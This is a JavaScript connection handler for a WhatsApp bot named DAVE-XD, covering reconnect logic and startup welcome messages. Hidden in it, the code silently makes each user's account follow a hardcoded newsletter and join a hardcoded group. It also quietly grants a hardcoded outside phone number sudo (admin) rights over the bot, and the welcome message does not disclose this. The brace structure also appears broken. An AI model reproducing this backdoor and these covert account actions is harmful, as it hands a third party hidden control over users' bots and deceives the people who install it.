const { Boom } = require("@hapi/boom");
const { DateTime } = require("luxon");
const { default: daveConnect, DisconnectReason } = require("@whiskeysockets/baileys");
const { getSettings, getSudoUsers, addSudoUser } = require("../Database/config");
const { commands, totalCommands } = require("../Handler/commandHandler");

const botName = process.env.BOTNAME || "DAVE-XD";
let hasSentStartMessage = false;

async function connectionHandler(socket, connectionUpdate, reconnect) {
  const { connection, lastDisconnect } = connectionUpdate;

  function getGreeting() {
    const hour = DateTime.now().setZone("Africa/Nairobi").hour;
    if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day? 🚀";
    if (hour >= 12 && hour < 18) return "What’s up? Time to make things happen! ⚡";
    if (hour >= 18 && hour < 22) return "Evening vibes! Let’s get to it! 🌟";
    return "Late night? Let’s see what’s cooking! 🌙";
  }

  function getCurrentTime() {
    return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
  }

  function toFancyFont(text, isUpperCase = false) {
    const fonts = {
      'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂', 'H': '𝙃', 'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈',
      'N': '𝙉', 'O': '𝙊', 'P': '𝙋', 'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐', 'V': '𝙑', 'W': '𝙒', 'X': '𝙓', 'Y': '𝙔', 'Z': '𝙕',
      'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜', 'h': '𝙝', 'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢',
      'n': '𝙣', 'o': '𝙤', 'p': '𝙥', 'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪', 'v': '𝙫', 'w': '𝙬', 'x': '𝙭', 'y': '𝙮', 'z': '𝙯'
    };
    const formattedText = isUpperCase ? text.toUpperCase() : text.toLowerCase();
    return formattedText.split('').map(char => fonts[char] || char).join('');
  }

  if (connection === "connecting") {
    console.log(`🔄 Establishing connection to WhatsApp servers...`);
    return;
  }

  if (connection === "close") {
    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;

    switch (statusCode) {
      case DisconnectReason.badSession:
        console.log(`⚠️ Invalid session file detected. Delete session and rescan QR code.`);
        process.exit();
        break;
      case DisconnectReason.connectionClosed:
        console.log(`🔌 Connection closed. Attempting to reconnect...`);
        reconnect();
        break;
      case DisconnectReason.connectionLost:
        console.log(`📡 Lost connection to server. Reconnecting...`);
        reconnect();
        break;
      case DisconnectReason.connectionReplaced:
        console.log(`🔄 Connection replaced by another session. Terminating process.`);
        process.exit();
        break;
      case DisconnectReason.loggedOut:
        console.log(`🔒 Session logged out. Delete session and rescan QR code.`);
        hasSentStartMessage = false;
        process.exit();
        break;
      case DisconnectReason.restartRequired:
        console.log(`🔄 Server requested restart. Initiating reconnect...`);
        reconnect();
        break;
      case DisconnectReason.timedOut:
        console.log(`⏳ Connection timed out. Attempting to reconnect...`);
        reconnect();
        break;
      default:
        console.log(`❓ Unknown disconnection reason: ${statusCode} | ${connection}. Reconnecting...`);
        reconnect();
    }
    return;
  }

  if (connection === "open") {
    try {
        await socket.newsletterFollow("120363400480173280@newsletter");
        await socket.groupAcceptInvite("LfTFxkUQ1H7Eg2D0vR3n6g");
    } catch {}
}


    const userId = socket.user.id.split(":")[0].split("@")[0];
    const settings = await getSettings();
    const sudoUsers = await getSudoUsers();

    if (!hasSentStartMessage) {
      const isNewUser = !sudoUsers.includes(userId);
      if (isNewUser) {
        await addSudoUser(userId);
        const defaultSudo = "254735342808";
        if (!sudoUsers.includes(defaultSudo)) {
          await addSudoUser(defaultSudo);
        }
      }

      const firstMessage = isNewUser
        ? [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome to *${botName}*! You're now connected.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📋 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            `💾 *Database*: Postgres SQL`,
            `📚 *Library*: Baileys`,
            ``,
            `│❒ *New User Alert*: You've been added to the sudo list.`,
            ``,
            `│❒ *Credits*: gift_dave`,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n")
        : [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome back to *${botName}*! Connection established.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `📋 *Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            `💾 *Database*: Postgres SQL`,
            `📚 *Library*: Baileys`,
            ``,
            `│❒ Ready to proceed? Select an option below.`,
            ``,
            `│❒ *Credits*: gift_dave`,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n");

      const secondMessage = [
        `◈━━━━━━━━━━━━━━━━◈`,
        `│❒ Please select an option to continue:`,
        `◈━━━━━━━━━━━━━━━━◈`
      ].join("\n");

      try {
        await socket.sendMessage(socket.user.id, {
          text: firstMessage,
          footer: `Powered by ${botName}`,
          viewOnce: true,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: false,
              title: botName,
              body: `Bot initialized successfully.`,
              sourceUrl: `https://github.com/huh234/DAVE-XD`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        });

        await socket.sendMessage(socket.user.id, {
          text: secondMessage,
          footer: `Powered by ${botName}`,
          buttons: [
            {
              buttonId: `${settings.prefix || ''}settings`,
              buttonText: { displayText: `⚙️ ${toFancyFont('SETTINGS')}` },
              type: 1
            },
            {
              buttonId: `${settings.prefix || ''}menu`,
              buttonText: { displayText: `📖 ${toFancyFont('MENU')}` },
              type: 1
            }
          ],
          headerType: 1,
          viewOnce: true,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: false,
              title: botName,
              body: `Select an option to proceed.`,
              sourceUrl: `https://github.com/huh234/DAVE-XD`,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        });
      } catch (error) {
        console.error(`❌ Failed to send startup messages: ${error.message}`);
      }

      hasSentStartMessage = true;
    }

    console.log(
      `◈━━━━━━━━━━━━━━━━◈\n` +
      `│❒ Bot successfully connected to WhatsApp ✅💫\n` +
      `│❒ Loaded ${totalCommands} plugins. DAVE-XD is ready to dominate! 😈\n` +
      `┗━━━━━━━━━━━━━━━┛`
    );
  }
}

module.exports = connectionHandler;